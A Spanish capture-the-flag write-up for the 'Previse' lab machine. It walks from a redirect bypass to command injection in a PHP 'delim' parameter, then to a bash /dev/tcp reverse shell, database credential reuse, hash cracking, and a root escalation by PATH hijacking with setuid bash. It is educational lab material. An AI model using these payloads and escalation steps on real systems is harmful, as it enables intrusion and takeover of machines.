---
title: Previse WriteUp
date: 2023-04-07
categories: [WriteUps, Máquinas Linux]
tags: [Redirect, BurpSuite, código, grep, MySQL, Reverse Shell, Path Hijacking, sudo]
image:
  path: ../../assets/img/writeups/Previse/previse.png
  width: 528
  height: 340
  alt: Banner Previse
---

Realizo un reconocimiento y encuentro los puertos 22-ssh y 80-web abiertos. Hay una panel login en la web pero no me puedo registrar. Realizando un fuzzing encuentro subdirectorios a los que de primeras no puedo acceder porque me redirecciona al /login.php, pero desde burpsuite fuerzo que no me redireccione y consigo registrarme. Ya dentro del panel de usuario puede descargar un backup.zip.  
Analizando el código encuentro un comando exec que puedo aprovechar para conseguir RCE y la reverse shell.

Escalada: Entro como www-data al ordenador objetivo. Analizando el backup de antes encontré una contraseña a la base de datos. Entro a la base de datos con la contraseña y consigo un hash del usuario m4lwhere. Ya soy m4lwhere. 

Para la escalada a root me aprovecho de un privilegio de sudo en un script. En el script se ejecuta un comando de manera relativa, así que hago un path hijacking y consigo convertirme en root.

## Reconocimiento

Hola geeente!!!. La máquina a realizar es la máquina Previse, con ip `10.10.11.104`.

Lo primero es saber si tenemos conectividad con la máquina, para ello realizamos un ping. Al principio le puede costar, cancela el ping y vuelve a lanzarlo si es así.
```
❯ ping -c 1 10.10.11.104

PING 10.10.11.104 (10.10.11.104) 56(84) bytes of data.
64 bytes from 10.10.11.104: icmp_seq=1 ttl=63 time=43.1 ms

--- 10.10.11.104 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.123/43.123/43.123/0.000 ms
```
1 paquete enviado, 1 paquete recibido, todo correcto, sigamos.

Usaré herramienta **nmap** para descubrir los puertos abiertos de la máquina a pentestear.
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.104 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-03 15:59 CEST
Initiating SYN Stealth Scan at 15:59
Scanning 10.10.11.104 [65535 ports]
Discovered open port 22/tcp on 10.10.11.104
Discovered open port 80/tcp on 10.10.11.104
Completed SYN Stealth Scan at 15:59, 12.69s elapsed (65535 total ports)
Nmap scan report for 10.10.11.104
Host is up, received user-set (0.049s latency).
Scanned at 2023-04-03 15:59:04 CEST for 13s
Not shown: 65357 closed tcp ports (reset), 176 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.93 seconds
           Raw packets sent: 66265 (2.916MB) | Rcvd: 65396 (2.616MB)
```
Las opciones del comando anterior quieren decir:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.104 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts -> Exportará el output a un fichero grepeable que llamaremos "allPorts"

Encuentro los puertos 22-ssh y 80-http. Busquemos en más profundidad con otro comando de nmap:
```
❯ nmap -p22,80 -sC -sV 10.10.11.104 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-03 16:04 CEST
Nmap scan report for 10.10.11.104
Host is up (0.047s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.90 seconds
```
* -sC : Lanza una serie de scripts básicos de enumeración.
* -sV : Para averiguar la versión de los servicios activos.
* -oN : Exporta en formato Normal de Nmap.

Entonces lo dicho, tenemos el puerto 22-ssh y el puerto 80-http. Por el ssh al no tener credenciales de momento vamos a dejarlo en segundo plano, empezaré la búsqueda de vulnerabilidades por el puerto 80.

## Buscando vulnerabilidades

Usaré la herramienta whatweb, programa a nivel de terminal para analizar las tecnologías y algo de información de la web.
```
❯ whatweb http://10.10.11.104

http://10.10.11.104 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]

http://10.10.11.104/login.php [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], PasswordField[password], Script, Title[Previse Login]
```
Puedo ver que me redirige a login.php, que seguramente estamos ante un panel login y que puede que tengamos un usuario válido llamado m4lwhere.

Entremos desde el navegador a la página para ver que pinta tiene.

![Web]({{ 'assets/img/writeups/Previse/web.png' | relative_url }}){: .center-image }

Exactamente, hay un panel de login, pruebo con algunas credenciales típicas como admin:admin, admin:1234, admin:password pero nada. Pruebo a meter como usuario m4lwhere para ver si la respuesta cambia si el usuario es válido (en el caso de que sea un usuario), pero siempre sale la misma respuesta "Invalid Username or Password".  
Antes de probar inyecciones al panel voy a fuzzear un poco.

```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.104/FUZZ
```
Opciones:
* -c : Formato coloreado.
* --hc : Hide Code. Ocultar el código indicado.
* -t : Número de hilos. Velocidad.
* -w : Diccionario.

Y este es el resultado de la búsqueda:

![Wfuzz]({{ 'assets/img/writeups/Previse/wfuzz.png' | relative_url }}){: .center-image }

Encontramos los subidirectos /css, /js y /server-status, el resto son comentarios sobre las licencias del programa. En las dos primeras no hay nada interesante, en /server-status nos encontramos con un "forbidden", es decir, el recurso existe pero no tenemos permiso para acceder. Podriamos realizar un fuzzing sobre este subdirectorio también.

Realizo otro fuzzing, esta vez buscando archivos txt y php:
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://10.10.11.104/FUZZ.FUZ2Z
```
Encuentro unos cuantos **archivos .php**: files, header, nav, footer, download, index, status, login, logout, config, logs, accounts. La mayoría redirreciona a login.php excepto; header, nav, footer y config.

El config.php parece que está vacio de contenido. Y desde el navegador tampoco vemos nada.
```
000002980:   200        0 L      0 W        0 Ch        "config - php"
```
En header.php nada. En footer.php hay una pestaña que señala "created for m4lware" y redirige a una página. No veo nada interesante.  

En nav.php si que hay cosillas. Veo algo similar, pero por terminal, al hacer un curl a accounts. Por cierto quizás podríamos crear un usuario desde curl o forzar un "200 OK" desde burpsuite.
``` 
❯ curl -s http://10.10.11.104/accounts.php | html2text

* Home
    * ACCOUNTS
          o CREATE_ACCOUNT
    * FILES
    * MANAGEMENT_MENU
          o WEBSITE_STATUS
          o LOG_DATA
    * LOG_OUT

***** Add New Account *****
Create new user.
ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!
Usernames and passwords must be between 5 and 32 characters!
 [username            ]
 [********************]
 [********************]
CREATE USER
Created_by_m4lwhere
```
Desde nav.php vemos esto:

![nav]({{ 'assets/img/writeups/Previse/nav.png' | relative_url }}){: .center-image }

Todas esos recursos me redireccionan a login.php, así que probaré a pasarlo por burpsuite y forzar que no me redireccione. Opto por hacer esto último con *accounts.php**, ya que podría crearme un usuario, y funciona de perlas. Así lo hago:

1. Abro el burpsuite, voy a proxy y dejo la pestaña en "intercept is on"
2. En el navegador firefox habilito desde la herramienta foxyproxy el proxy a burpsuite. Así lo tendría configurado:

![Foxy-Proxy]({{ 'assets/img/writeups/Previse/foxyproxy.png' | relative_url }}){: .center-image }

3. Selecciono en nav.php CREATE_ACCOUNTS. Entonces la petición pasará por burpsuite.
4. Aparecerá la petición por bursuite, ahora para evitar la redirección; Click derecho --> do intercept -->response to 'this' request --> forward (verás un 302 posiblemente en la respuesta)--> Cambias ese 302 FOUND por un 200 OK --> Forward
5. Cuando vuelvas al navegador verás esto. Recuerda cambiar la pestaña a "intercept is off".

![Accounts]({{ 'assets/img/writeups/Previse/accounts.png' | relative_url }}){: .center-image }

Parece ser que puedo crearme una cuenta. Además si he podido hacer esto con accounts.php quien me dice que no pueda con el resto -risa maléfica aquí-.

Me creo el usuario **guise** y accedo al panel. De esta manera parece que podré ver el resto de recursos sin tener que forzar peticiones, más fácil.

![Panel]({{ 'assets/img/writeups/Previse/panel.png' | relative_url }}){: .center-image }

En el apartado FILES que está arriba, hay un archivo SITEBACKUP.ZIP y una columna de usuario con nombre **newguy**. Muy buena pinta, descargo el .zip y desde mi terminal:
```
> 7z l sitebackup.zip
```
Lo anterior permite visualizar lo que hay dentro antes de descomprimirlo. Como hay unos 10 archivos que se extraerán sin guardarlos en una carpeta usaré la opción -d en el comando siguiente para que meta todo en la carpeta backup:
```
❯ unzip -d backup siteBackup.zip
```
Y señores y señoras veo un config.php, archivo sin contenido en la web actual, se ve que en este backup de la web si que encontraremos contenido:
``` php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
Tenemos una contraseña a la base de datos. Escaneando los puertos al principio no hemos visto ningún servicio de base de datos activo, como por ejemplo podría ser el 3306-MySQL.  
Pero si estaba el puerto 22 y es posible que reciclen contraseñas, es una práctica muy común. Tenemos la contraseña **mySQL_p@ssw0rd!:)** que podría pertencer a los usuarios; root, newguy y m4lwhere, los usuarios vistos hasta ahora.

Pruebo a conectarme por ssh `ssh USER@10.10.11.104`, introduciendo esa contraseña encontrada con cada usuario nombrado antes y nada. Así que sigo buscando.

Tengo el código fuente de la web. Voy a buscar cosillas interesantes. Primero haré una búsqueda de usuarios y contraseñas que puedan existir:
```
❯ grep -riE "passwd|password|user"
```
Existen coincidenias pero la única contraseña que saco es la que encontramos antes de la base de datos.

La segunda búsqueda en el código fuente es buscar por funciones php peligrosas, es decir, las que realicen ejecución de comandos:
```
❯ grep -r -e exec -e system -e popen -e passthru -e shell_exec

download.php:        flush(); // Flush system headers
logs.php:$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
logs.php:    flush(); // Flush system headers
```
* -r : Busca de manera recursiva.
* -E : Patrones usando expresiones regulares extendidas, para la tubería en esa búsqueda.
* -e : Igual que el anterior, pero sin usar tubería.
* -i : Ignora si es con mayúsculas o minúsculas

¡¡Encontramos una función **exec** que pertenece a logs.php!!. Ojeando en download.php vemos que tiene que ver con la elección de un delimitador a la hora de exportar un fichero out.log que muestra los usuarios que se han descargado el backup, la hora y el file ID. 

Sin ver el código también podríamos haber intentado una inyección de código en el campo **delim** al suponernos que detrás se realiza una coincidiencia en patrones de texto y reconstruyendo el contenido con el deliminitador indicado. Puede que en vez de una comparativa dentro del php llamará fuera de este para hacerla con bash.

## Explotación

Interceptaré la petición de download.php por burpsuite e intentaré inyectar comandos.

![Submit]({{ 'assets/img/writeups/Previse/submit.png' | relative_url }}){: .center-image }

Y ya desde burpsuite introduzco en el campo delim un ping a mi ordenador para comprobar que tengo RCE.

![Burpsuite-Ping]({{ 'assets/img/writeups/Previse/burpPing.png' | relative_url }}){: .center-image }

Recibo la petición:
```
❯ tcpdump -i tun0 icmp -n

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:04:33.585348 IP 10.10.11.104 > 10.10.14.7: ICMP echo request, id 2384, seq 1, length 64
10:04:33.585461 IP 10.10.14.7 > 10.10.11.104: ICMP echo reply, id 2384, seq 1, length 64
```

De perlas, ahora toca mandarnos la reverse shell, en vez de el ping mando este comando:
```
delim=comma;bash -c 'bash -i >%26 /dev/tcp/10.10.14.7/443 0>%261'
``` 
Estoy en escucha en mi terminal;
```
> nc -nlvp 443

connect to [10.10.14.7] from (UNKNOWN) [10.10.11.104] 58900
bash: cannot set terminal process group (1426): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ whoami
whoami
www-data
```

Hay que realizar un **tratamiento de la tty** porque sino al hacer Ctrl + C se nos irá a la puñeta, además de otras inconveniencias.

Desde máquina objetivo:
``` 
www-data@previse:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@previse:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
```
Desde mi máquina:
```
> stty raw -echo; fg
        reset xterm
```
Y me retorna a la máquina objetivo;
```
www-data@previse:/$ export TERM=xterm
www-data@previse:/$ export SHELL=bash
www-data@previse:/$ stty rows 38 columns 184
```
Realizado el tratamiento de la consola.

Somos el usuario www-data. Tendré que escalar privilegios al usuario m4lwhere, en su directorio home se encuentra la primera flag. Luego escalaré al usuario root. Si pudiera hacerlo directamente, el escalar a root, pues perfecto, pero no suele ser el caso.

## Escalada de privilegios

```
www-data@previse:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@previse:/$ sudo -l
[sudo] password for www-data: 
Sorry, try again.

www-data@previse:/$ find \-perm -4000 2>/dev/null
./usr/bin/newgidmap
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/newuidmap
./usr/bin/gpasswd
./usr/bin/traceroute6.iputils
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/at
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/lib/snapd/snap-confine
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./bin/su
./bin/fusermount
./bin/umount
./bin/mount
./bin/ping

www-data@previse:/$ uname -a
Linux previse 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

www-data@previse:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic

www-data@previse:/$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep

www-data@previse:/$ crontab -l 
no crontab for www-data
``` 
No veo nada interesante. A base de hacer máquinas te acostumbras a ver el mismo tipo de cosas que no son vulnerables, al menos que yo sepa claro.

Voy a enumerar un poquillo:
```
www-data@previse:/home/m4lwhere$ ls -la
total 44
drwxr-xr-x 5 m4lwhere m4lwhere 4096 Jul 28  2021 .
drwxr-xr-x 3 root     root     4096 May 25  2021 ..
lrwxrwxrwx 1 root     root        9 Jun  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 m4lwhere m4lwhere 3771 Apr  4  2018 .bashrc
drwx------ 2 m4lwhere m4lwhere 4096 May 25  2021 .cache
drwxr-x--- 3 m4lwhere m4lwhere 4096 Jun 12  2021 .config
drwx------ 4 m4lwhere m4lwhere 4096 Jun 12  2021 .gnupg
-rw-r--r-- 1 m4lwhere m4lwhere  807 Apr  4  2018 .profile
-rw-r--r-- 1 m4lwhere m4lwhere   75 May 31  2021 .selected_editor
lrwxrwxrwx 1 root     root        9 Jul 28  2021 .viminfo -> /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere   75 Jun 18  2021 .vimrc
-r-------- 1 m4lwhere m4lwhere   33 Apr  6 06:13 user.txt
```
El user.txt, la primera flag, no puedo abrirla siendo www-data.

Recuerda que habíamos encontrado una contraseña a la base de datos:
``` php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
No puedo cambiarme a ningún usuario con esta contraseña pero si que puedo probar a conectarme a la base de datos ahora que estoy ya dentro:
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
```
En la tabla files no veo nada interesante. En cambio en la tabla accounts;
```
mysql> describe accounts;
+------------+--------------+------+-----+-------------------+----------------+
| Field      | Type         | Null | Key | Default           | Extra          |
+------------+--------------+------+-----+-------------------+----------------+
| id         | int(11)      | NO   | PRI | NULL              | auto_increment |
| username   | varchar(50)  | NO   | UNI | NULL              |                |
| password   | varchar(255) | NO   |     | NULL              |                |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
+------------+--------------+------+-----+-------------------+----------------+
4 rows in set (0.00 sec)

mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | guise    | $1$🧂llol$n/fM3e.vxjCMyyttBW0kn1 | 2023-04-06 07:13:38 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)
``` 
Parecen contraseñas en formato hash. La de guise es la mía. Intentaré crackear la de m4lwhere. Ese hash tiene un emoji, un dibujo de un salero. Si lo copio al cuadro de búsqueda del navegador me sale el dibujo, además sale info de que es un hash MD5.

```
❯ hashcat --example-hashes | grep  'MD5'

TYPE: MD5
TYPE: HMAC-MD5 (key = $pass)
TYPE: HMAC-MD5 (key = $salt)
TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
TYPE: Apache $apr1$ MD5, md5apr1, MD5 (APR)
```
El cuarto tipo pone "\$1$" justo como empieza nuestro hash. Quiero ver cual es el modo de ese tipo.
```
❯ hashcat --example-hashes | grep "TYPE: md5crypt" -B 2

MODE: 500
TYPE: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
```
La opción -B muestra dos lineas hacia arriba. Es el modo 500.  
Crackeamos el hash que he guardado en el fichero hash.hash:
```
> hashcat -m 500 hash.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
Al cabo de un buen rato, mi ordenador no es muy potente, descifra el hash.

![Password]({{ 'assets/img/writeups/Previse/password.png' | relative_url }}){: .center-image }

La contraseña es: ilovecody112235!

Probamos a cambiar de usuario;
```
www-data@previse:/home/m4lwhere$ su m4lware
```
No nos sirve. Realmente es la contraseña de acceso del usuario m4lwhere por ssh.
```
❯ sshpass -p 'ilovecody112235!' ssh m4lwhere@10.10.11.104

m4lwhere@previse:~$ whoami
m4lwhere
```
¡¡¡¡Obtenemos la primera flag!!!!!
```
m4lwhere@previse:~$ cat user.txt

d436e73d684d638ab6912*******
```

## Escalada a root

```
m4lwhere@previse:~$ id
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)

m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
Puedo correr como el usuario root el script access_backup.sh

Inspecciono el script;
```
m4lwhere@previse:~$ ls -l /opt/scripts/access_backup.sh

-rwxr-xr-x 1 root root 486 Jun  6  2021 /opt/scripts/access_backup.sh
```
No tengo permisos de escritura del script, si los tuviera lo modificaría a mi antojo.
```
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
```
Y este es el contenido:
``` bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time


gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
El problema de este script es que se está llamando al comando gzip de manera relativa. La manera correcta de llamarlo es mediante su ruta absoluta que es /bin/gzip. 
Llamarlo de manera relativa posibilita un path hijacking o secuestro del PATH.

Explico un poco: El sudo permite correr con privilegios de otro usuario, en este caso root, un programa determinado, peeero se utiliza el PATH del usuario que corre el programa, es decir, mi PATH, el PATH de m4lwhere. Recuerda que el PATH sirve para que el sistema encuentre los ejecutables que intentes lanzar, por ejemplo:
```
m4lwhere@previse:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

m4lwhere@previse:~$ sh
```
Si quiero lanzarme sh, el sistema buscará por el órden del path, primero por /usr/local/sbin luego por /usr/local/bin y así. Si no esta en el path no lo encontrará.

Procedo a realizar un Path Hijacking:
```
m4lwhere@previse:~$ export PATH=.:$PATH
m4lwhere@previse:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ touch gzip
m4lwhere@previse:~$ chmod +x gzip
```
He puesto como inicio del path mi ruta actual.  
Dentro de mi script gzip pondré esto:
``` bash
#!/bin/bash

chmod 4755 /bin/bash
```
Por último ejecuto el script con el privilegio sudo:
```
m4lwhere@previse:~$ sudo -u root /opt/scripts/access_backup.sh

m4lwhere@previse:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash

m4lwhere@previse:~$ bash -p
bash-4.4# whoami
root
```
Ueueueueuue soooyyy roooot!!!!!!. Como me mola el path hijacking.

Consigo la flag de root:
```
bash-4.4# cat /root/root.txt
0a591826de5233735c05dd*******
``` 
Fin.





 















